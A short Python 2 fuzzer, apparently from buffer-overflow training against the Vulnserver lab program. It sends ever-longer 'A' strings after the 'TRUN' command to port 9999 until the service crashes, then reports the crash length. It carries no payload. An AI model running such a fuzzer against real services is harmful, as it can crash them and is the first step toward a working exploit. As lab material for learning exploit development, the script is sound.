#! /usr/bin/python

#fuzzer.py 

import sys, socket 

from time import sleep 

buffer = "A" * 100 

while True : 

	try: # take out 

		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('', 9999)) # windows ip and port to be given in 
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	except: #take out 

		print "Fuzzing crashed at %s bytes" % str(len(buffer))	
		sys.exit()

		

# change mode to executable , 
# chmod +x fuzzer.py
